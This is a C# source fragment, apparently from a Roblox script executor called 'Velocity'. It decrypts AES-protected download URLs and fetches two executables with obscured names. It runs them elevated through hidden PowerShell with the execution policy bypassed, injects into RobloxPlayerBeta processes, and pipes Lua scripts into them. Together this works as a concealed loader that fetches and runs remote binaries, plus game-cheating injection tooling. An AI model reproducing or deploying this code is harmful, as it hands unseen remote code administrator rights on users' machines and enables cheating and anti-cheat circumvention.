
            private static DownloadUrlData ParseJson(string json)
             {
             return new DownloadUrlData()
               {
            L1 = Get("L1"),
            L2 = Get("L2"),
              question = Get("question")
            };

            string Get(string key)
              {
             Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
              return !match.Success ? (string)null : match.Groups[1].Value;
            }
             }

            public static byte[] Base64Decode(string plainText) => Convert.FromBase64String(plainText);

            private bool IsPidRunning(int pid)
            {
                try
                {
                    Process.GetProcessById(pid);
                    return true;
                }
                catch (ArgumentException)
                {
                    return false;
                }
            }

             private void AutoUpdate()
            {
                         HttpResponseMessage result1 = this.client.GetAsync(this.current_download_links_url).Result;
                         DownloadUrlData json = APIXV.ParseJson(result1.Content.ReadAsStringAsync().Result);
                          string requestUri1 = AESEncryption.Decrypt(json.L1, json.question);
                         string requestUri2 = AESEncryption.Decrypt(json.L2, json.question);
                         string result2;
                         try
                          {
                             result2 = this.client.GetStringAsync(this.current_version_url).Result;
               }
                         catch (Exception)
                          {
                            return;
                }
                        string str = "";
                       if (File.Exists("Temp\\Bin\\current_version.txt"))
                  str = File.ReadAllText("Temp\\Bin\\current_version.txt");
                        if (result2 != str)
                        {
                            if (File.Exists("Temp\\Bin\\erto3e4rortoergn.exe"))
                                 File.Delete("Temp\\Bin\\erto3e4rortoergn.exe");
                             if (File.Exists("Temp\\Bin\\Decompiler.exe"))
                 File.Delete("Temp\\Bin\\Decompiler.exe");
                HttpResponseMessage result3 = this.client.GetAsync(requestUri2).Result;
                      if (result1.IsSuccessStatusCode)
                  File.WriteAllBytes("Temp\\Bin\\erto3e4rortoergn.exe", result3.Content.ReadAsByteArrayAsync().Result);
                  HttpResponseMessage result4 = this.client.GetAsync(requestUri1).Result;
                          if (result1.IsSuccessStatusCode)
                  File.WriteAllBytes("Temp\\Bin\\Decompiler.exe", result4.Content.ReadAsByteArrayAsync().Result);
             }
                 File.WriteAllText("Temp\\Bin\\current_version.txt", result2);
               }

            public void Initialize()
            {
                if (!Directory.Exists("Temp\\workspace"))
                    Directory.CreateDirectory("Temp\\workspace");
                if (!Directory.Exists("Temp\\Bin"))
                    Directory.CreateDirectory("Temp\\Bin");
                this.SInitialize();
                this.AutoUpdate();

                string decompilerPath = Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Temp\\Bin\\Decompiler.exe"));
                if (File.Exists(decompilerPath))
                {
                    string escapedDecompilerPath = EscapePowerShellSingleQuoted(decompilerPath);
                    string command =
                        $"Start-Process -FilePath '{escapedDecompilerPath}' -WindowStyle Hidden -Verb RunAs | Out-Null";
                    ProcessStartInfo startInfo = BuildHiddenPowerShellStart(command);
                    Process.Start(startInfo)?.Dispose();
                }

                this.CommunicationTimer = new System.Timers.Timer(100.0);
                this.CommunicationTimer.Elapsed += (ElapsedEventHandler)((source, e) =>
                {
                    for (int index = this.injected_pids.Count - 1; index >= 0; --index)
                    {
                        int injectedPid = this.injected_pids[index];
                        if (!this.IsPidRunning(injectedPid))
                            this.injected_pids.RemoveAt(index);
                    }
                    string plainText = $"setworkspacefolder: {Directory.GetCurrentDirectory()}\\Temp\\workspace";
                    foreach (int injectedPid in this.injected_pids)
                        NamedPipes.LuaPipe(APIXV.Base64Encode(plainText), injectedPid);
                });
                this.CommunicationTimer.Start();
            }

            public void SInitialize()
            {
                if (this.CommunicationTimer != null)
                {
                    try
                    {
                        this.CommunicationTimer.Stop();
                        this.CommunicationTimer.Dispose();
                    }
                    catch
                    {
                    }
                    finally
                    {
                        this.CommunicationTimer = (System.Timers.Timer)null;
                    }
                }
                if (this.decompilerProcess != null)
                {
                    try
                    {
                        if (!this.decompilerProcess.HasExited)
                            this.decompilerProcess.Kill();
                    }
                    catch
                    {
                    }
                    finally
                    {
                        try
                        {
                            this.decompilerProcess.Dispose();
                        }
                        catch
                        {
                        }
                        this.decompilerProcess = (Process)null;
                    }
                }

                Process[] decompilerProcesses = Array.Empty<Process>();
                try
                {
                    decompilerProcesses = Process.GetProcessesByName("Decompiler");
                }
                catch
                {
                }
                foreach (Process process in decompilerProcesses)
                {
                    try
                    {
                        process.Kill();
                        process.WaitForExit(1200);
                    }
                    catch
                    {
                    }
                    finally
                    {
                        try
                        {
                            process.Dispose();
                        }
                        catch
                        {
                        }
                    }
                }

                this.injected_pids.Clear();
            }

            public bool IsAttached(int pid) => this.injected_pids.Contains(pid);

            public async Task<VelocityStates> Attach(int pid)
            {
                if (this.injected_pids.Contains(pid))
                {
                    this.VelocityStatus = VelocityStates.Attached;
                    return VelocityStates.Attached;
                }
                this.VelocityStatus = VelocityStates.Attaching;
                try
                {
                    string exePath = Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Temp\\Bin\\erto3e4rortoergn.exe"));
                    if (!File.Exists(exePath))
                    {
                        this.VelocityStatus = VelocityStates.Error;
                        return VelocityStates.Error;
                    }

                    string escapedExePath = EscapePowerShellSingleQuoted(exePath);
                    string escapedPid = EscapePowerShellSingleQuoted(pid.ToString());
                    string command =
                        $"$proc = Start-Process -FilePath '{escapedExePath}' -ArgumentList '{escapedPid}' -WindowStyle Hidden -Verb RunAs -PassThru; " +
                        "$proc.WaitForExit(); exit $proc.ExitCode";

                    ProcessStartInfo psi = BuildHiddenPowerShellStart(command);

                    using (Process process = Process.Start(psi))
                    {
                        if (process == null)
                        {
                            this.VelocityStatus = VelocityStates.Error;
                            return VelocityStates.Error;
                        }
                        await Task.Run((Action)(() => process.WaitForExit()));
                    }
                    this.injected_pids.Add(pid);
                    this.VelocityStatus = VelocityStates.Attached;
                    return VelocityStates.Attached;
                }
                catch
                {
                    this.VelocityStatus = VelocityStates.Error;
                    return VelocityStates.Error;
                }
            }

            private static ProcessStartInfo BuildHiddenPowerShellStart(string command)
            {
                return new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{command}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
            }

            private static string EscapePowerShellSingleQuoted(string value)
            {
                return (value ?? string.Empty).Replace("'", "''");
            }

            public async Task<VelocityStates> Attach0()
            {
                this.VelocityStatus = VelocityStates.Attaching;
                Process[] processes = Process.GetProcessesByName("RobloxPlayerBeta");
                List<int> validProcessIds;
                if (!((IEnumerable<Process>)processes).Any<Process>())
                {
                    this.VelocityStatus = VelocityStates.NoProcessFound;
                    return this.VelocityStatus;
                }
                else
                {
                    validProcessIds = ((IEnumerable<Process>)processes).Where<Process>((Func<Process, bool>)(proc => proc.MainWindowHandle != IntPtr.Zero && APIXV.IsWindowVisible(proc.MainWindowHandle) && !APIXV.IsIconic(proc.MainWindowHandle))).Select<Process, int>((Func<Process, int>)(proc => proc.Id)).ToList<int>();
                    if (!validProcessIds.Any<int>())
                    {
                        this.VelocityStatus = VelocityStates.NoProcessFound;
                        return this.VelocityStatus;
                    }
                    else
                    {
                        VelocityStates[] velocityStatesArray = await Task.WhenAll<VelocityStates>(validProcessIds.Select<int, Task<VelocityStates>>((Func<int, Task<VelocityStates>>)(id => this.Attach(id))));
                        if (((IEnumerable<VelocityStates>)velocityStatesArray).Any<VelocityStates>((Func<VelocityStates, bool>)(state => state == VelocityStates.Attached)))
                        {
                            this.VelocityStatus = VelocityStates.Attached;
                            return this.VelocityStatus;
                        }

                        this.VelocityStatus = ((IEnumerable<VelocityStates>)velocityStatesArray).Any<VelocityStates>((Func<VelocityStates, bool>)(state => state == VelocityStates.Error))
                            ? VelocityStates.Error
                            : VelocityStates.NotAttached;
                        return this.VelocityStatus;
                    }
                }
            }

            public async void attach0()
            {
                await this.Attach0();
            }



            public VelocityStates Execute(string script)
            {
                if (this.injected_pids.Count.Equals(0))
                    return VelocityStates.NotAttached;
                foreach (int injectedPid in this.injected_pids)
                    NamedPipes.LuaPipe(APIXV.Base64Encode(script), injectedPid);
                return VelocityStates.Executed;
            }
        }
        public class DownloadUrlData
        {
            public string L1 { get; set; }

            public string L2 { get; set; }

            public string question { get; set; }
        }
        public class AESEncryption
        {
            private const int KeySize = 256 /*0x0100*/;
            private const int SaltSize = 16 /*0x10*/;
            private const int NonceSize = 12;
            private const int TagSize = 16 /*0x10*/;
            private const int Iterations = 100000;

            [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
            private static extern uint BCryptOpenAlgorithmProvider(
              out IntPtr phAlgorithm,
              string pszAlgId,
              string pszImplementation,
              uint dwFlags);

            [DllImport("bcrypt.dll")]
            private static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

            [DllImport("bcrypt.dll")]
            private static extern uint BCryptGenerateSymmetricKey(
              IntPtr hAlgorithm,
              out IntPtr phKey,
              IntPtr pbKeyObject,
              uint cbKeyObject,
              byte[] pbSecret,
              uint cbSecret,
              uint dwFlags);

            [DllImport("bcrypt.dll")]
            private static extern uint BCryptDestroyKey(IntPtr hKey);

            [DllImport("bcrypt.dll")]
            private static extern uint BCryptEncrypt(
              IntPtr hKey,
              byte[] pbInput,
              uint cbInput,
              ref AESEncryption.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
              byte[] pbIV,
              uint cbIV,
              byte[] pbOutput,
              uint cbOutput,
              out uint pcbResult,
              uint dwFlags);

            [DllImport("bcrypt.dll")]
            private static extern uint BCryptDecrypt(
              IntPtr hKey,
              byte[] pbInput,
              uint cbInput,
              ref AESEncryption.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
              byte[] pbIV,
              uint cbIV,
              byte[] pbOutput,
              uint cbOutput,
              out uint pcbResult,
              uint dwFlags);

            [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
            private static extern uint BCryptSetProperty(
              IntPtr hObject,
              string pszProperty,
              byte[] pbInput,
              uint cbInput,
              uint dwFlags);

            public static string Encrypt(string plaintext, string password)
            {
                try
                {
                    if (string.IsNullOrEmpty(plaintext))
                        throw new ArgumentException("Plaintext cannot be empty");
                    if (string.IsNullOrEmpty(password))
                        throw new ArgumentException("Password cannot be empty");
                    byte[] randomBytes1 = AESEncryption.GenerateRandomBytes(16 /*0x10*/);
                    byte[] randomBytes2 = AESEncryption.GenerateRandomBytes(12);
                    byte[] key = AESEncryption.DeriveKey(password, randomBytes1);
                    byte[] tag;
                    byte[] src = AESEncryption.EncryptBCrypt(Encoding.UTF8.GetBytes(plaintext), key, randomBytes2, out tag);
                    byte[] dst = new byte[randomBytes1.Length + randomBytes2.Length + src.Length + tag.Length];
                    Buffer.BlockCopy((Array)randomBytes1, 0, (Array)dst, 0, randomBytes1.Length);
                    Buffer.BlockCopy((Array)randomBytes2, 0, (Array)dst, randomBytes1.Length, randomBytes2.Length);
                    Buffer.BlockCopy((Array)src, 0, (Array)dst, randomBytes1.Length + randomBytes2.Length, src.Length);
                    Buffer.BlockCopy((Array)tag, 0, (Array)dst, randomBytes1.Length + randomBytes2.Length + src.Length, tag.Length);
                    return Convert.ToBase64String(dst);
                }
                catch (Exception)
                {
                    throw;
                }
            }

            public static string Decrypt(string ciphertext, string password)
            {
                try
                {
                    if (string.IsNullOrEmpty(ciphertext))
                        throw new ArgumentException("Ciphertext cannot be empty");
                    if (string.IsNullOrEmpty(password))
                        throw new ArgumentException("Password cannot be empty");
                    byte[] src;
                    try
                    {
                        src = Convert.FromBase64String(ciphertext);
                    }
                    catch (FormatException)
                    {
                        throw;
                    }
                    int num = 44;
                    if (src.Length < num)
                        throw new CryptographicException("Invalid ciphertext: data too short");
                    byte[] numArray1 = new byte[16 /*0x10*/];
                    byte[] numArray2 = new byte[12];
                    int count = src.Length - 16 /*0x10*/ - 12 - 16 /*0x10*/;
                    byte[] numArray3 = new byte[count];
                    byte[] numArray4 = new byte[16 /*0x10*/];
                    Buffer.BlockCopy((Array)src, 0, (Array)numArray1, 0, 16 /*0x10*/);
                    Buffer.BlockCopy((Array)src, 16 /*0x10*/, (Array)numArray2, 0, 12);
                    Buffer.BlockCopy((Array)src, 28, (Array)numArray3, 0, count);
                    Buffer.BlockCopy((Array)src, 28 + count, (Array)numArray4, 0, 16 /*0x10*/);
                    byte[] key = AESEncryption.DeriveKey(password, numArray1);
                    return Encoding.UTF8.GetString(AESEncryption.DecryptBCrypt(numArray3, key, numArray2, numArray4));
                }
                catch (CryptographicException)
                {
                    throw;
                }
                catch (Exception)
                {
                    throw;
                }
            }

            private static byte[] EncryptBCrypt(byte[] plaintext, byte[] key, byte[] nonce, out byte[] tag)
            {
                IntPtr phAlgorithm = IntPtr.Zero;
                IntPtr phKey = IntPtr.Zero;
                GCHandle gcHandle1 = new GCHandle();
                GCHandle gcHandle2 = new GCHandle();
                tag = new byte[16 /*0x10*/];
                try
                {
                    uint num1 = AESEncryption.BCryptOpenAlgorithmProvider(out phAlgorithm, "AES", (string)null, 0U);
                    if (num1 != 0U)
                        throw new CryptographicException($"BCryptOpenAlgorithmProvider failed: 0x{num1:X8}");
                    byte[] bytes = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
                    uint num2 = AESEncryption.BCryptSetProperty(phAlgorithm, "ChainingMode", bytes, (uint)bytes.Length, 0U);
                    if (num2 != 0U)
                        throw new CryptographicException($"BCryptSetProperty failed: 0x{num2:X8}");
                    uint symmetricKey = AESEncryption.BCryptGenerateSymmetricKey(phAlgorithm, out phKey, IntPtr.Zero, 0U, key, (uint)key.Length, 0U);
                    if (symmetricKey != 0U)
                        throw new CryptographicException($"BCryptGenerateSymmetricKey failed: 0x{symmetricKey:X8}");
                    gcHandle1 = GCHandle.Alloc((object)nonce, (GCHandleType)3);
                    gcHandle2 = GCHandle.Alloc((object)tag, (GCHandleType)3);
                    AESEncryption.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo = new AESEncryption.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
                    {
                        cbSize = (uint)Marshal.SizeOf(typeof(AESEncryption.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)),
                        dwInfoVersion = 1,
                        pbNonce = gcHandle1.AddrOfPinnedObject(),
                        cbNonce = (uint)nonce.Length,
                        pbTag = gcHandle2.AddrOfPinnedObject(),
                        cbTag = (uint)tag.Length
                    };
                    byte[] pbOutput = new byte[plaintext.Length];
                    uint num3 = AESEncryption.BCryptEncrypt(phKey, plaintext, (uint)plaintext.Length, ref pPaddingInfo, (byte[])null, 0U, pbOutput, (uint)pbOutput.Length, out uint _, 0U);
                    if (num3 != 0U)
                        throw new CryptographicException($"BCryptEncrypt failed: 0x{num3:X8}");
                    return pbOutput;
                }
                finally
                {
                    if (gcHandle1.IsAllocated)
                        gcHandle1.Free();
                    if (gcHandle2.IsAllocated)
                        gcHandle2.Free();
                    if (phKey != IntPtr.Zero)
                    {
                        int num4 = (int)AESEncryption.BCryptDestroyKey(phKey);
                    }
                    if (phAlgorithm != IntPtr.Zero)
                    {
                        int num5 = (int)AESEncryption.BCryptCloseAlgorithmProvider(phAlgorithm, 0U);
                    }
                }
            }

            private static byte[] DecryptBCrypt(byte[] ciphertext, byte[] key, byte[] nonce, byte[] tag)
            {
                IntPtr phAlgorithm = IntPtr.Zero;
                IntPtr phKey = IntPtr.Zero;
                GCHandle gcHandle1 = new GCHandle();
                GCHandle gcHandle2 = new GCHandle();
                try
                {
                    uint num1 = AESEncryption.BCryptOpenAlgorithmProvider(out phAlgorithm, "AES", (string)null, 0U);
                    if (num1 != 0U)
                        throw new CryptographicException($"BCryptOpenAlgorithmProvider failed: 0x{num1:X8}");
                    byte[] bytes = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
                    uint num2 = AESEncryption.BCryptSetProperty(phAlgorithm, "ChainingMode", bytes, (uint)bytes.Length, 0U);
                    if (num2 != 0U)
                        throw new CryptographicException($"BCryptSetProperty failed: 0x{num2:X8}");
                    uint symmetricKey = AESEncryption.BCryptGenerateSymmetricKey(phAlgorithm, out phKey, IntPtr.Zero, 0U, key, (uint)key.Length, 0U);
                    if (symmetricKey != 0U)
                        throw new CryptographicException($"BCryptGenerateSymmetricKey failed: 0x{symmetricKey:X8}");
                    gcHandle1 = GCHandle.Alloc((object)nonce, (GCHandleType)3);
                    gcHandle2 = GCHandle.Alloc((object)tag, (GCHandleType)3);
                    AESEncryption.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo = new AESEncryption.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
                    {
                        cbSize = (uint)Marshal.SizeOf(typeof(AESEncryption.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)),
                        dwInfoVersion = 1,
                        pbNonce = gcHandle1.AddrOfPinnedObject(),
                        cbNonce = (uint)nonce.Length,
                        pbTag = gcHandle2.AddrOfPinnedObject(),
                        cbTag = (uint)tag.Length
                    };
                    byte[] pbOutput = new byte[ciphertext.Length];
                    uint num3 = AESEncryption.BCryptDecrypt(phKey, ciphertext, (uint)ciphertext.Length, ref pPaddingInfo, (byte[])null, 0U, pbOutput, (uint)pbOutput.Length, out uint _, 0U);
                    if (num3 != 0U)
                        throw new CryptographicException($"BCryptDecrypt failed: 0x{num3:X8} - Wrong password or corrupted data");
                    return pbOutput;
                }
                finally
                {
                    if (gcHandle1.IsAllocated)
                        gcHandle1.Free();
                    if (gcHandle2.IsAllocated)
                        gcHandle2.Free();
                    if (phKey != IntPtr.Zero)
                    {
                        int num4 = (int)AESEncryption.BCryptDestroyKey(phKey);
                    }
                    if (phAlgorithm != IntPtr.Zero)
                    {
                        int num5 = (int)AESEncryption.BCryptCloseAlgorithmProvider(phAlgorithm, 0U);
                    }
                }
            }

            private static byte[] DeriveKey(string password, byte[] salt)
            {
                return AESEncryption.PBKDF2_SHA256(Encoding.UTF8.GetBytes(password), salt, 100000, 32 /*0x20*/);
            }

            private static byte[] PBKDF2_SHA256(
              byte[] password,
              byte[] salt,
              int iterations,
              int outputBytes)
            {
                using (HMACSHA256 hmacshA256 = new HMACSHA256(password))
                {
                    int count = ((HashAlgorithm)hmacshA256).HashSize / 8;
                    int num = (int)Math.Ceiling((double)outputBytes / (double)count);
                    byte[] numArray = new byte[num * count];
                    for (int index1 = 1; index1 <= num; ++index1)
                    {
                        byte[] dst = new byte[salt.Length + 4];
                        Buffer.BlockCopy((Array)salt, 0, (Array)dst, 0, salt.Length);
                        Buffer.BlockCopy((Array)AESEncryption.GetBigEndianBytes(index1), 0, (Array)dst, salt.Length, 4);
                        byte[] hash = ((HashAlgorithm)hmacshA256).ComputeHash(dst);
                        byte[] src = (byte[])hash.Clone();
                        for (int index2 = 1; index2 < iterations; ++index2)
                        {
                            hash = ((HashAlgorithm)hmacshA256).ComputeHash(hash);
                            for (int index3 = 0; index3 < src.Length; ++index3)
                                src[index3] ^= hash[index3];
                        }
                        Buffer.BlockCopy((Array)src, 0, (Array)numArray, (index1 - 1) * count, count);
                    }
                    byte[] dst1 = new byte[outputBytes];
                    Buffer.BlockCopy((Array)numArray, 0, (Array)dst1, 0, outputBytes);
                    return dst1;
                }
            }

            private static byte[] GetBigEndianBytes(int value)
            {
                byte[] bytes = BitConverter.GetBytes(value);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(bytes);
                return bytes;
            }

            private static byte[] GenerateRandomBytes(int length)
            {
                byte[] randomBytes = new byte[length];
                using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
                    ((RandomNumberGenerator)cryptoServiceProvider).GetBytes(randomBytes);
                return randomBytes;
            }

            private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
            {
                public uint cbSize;
                public uint dwInfoVersion;
                public IntPtr pbNonce;
                public uint cbNonce;
                public IntPtr pbAuthData;
                public uint cbAuthData;
                public IntPtr pbTag;
                public uint cbTag;
                public IntPtr pbMacContext;
                public uint cbMacContext;
                public uint cbAAD;
                public ulong cbData;
                public uint dwFlags;
            }
        }

    }
}
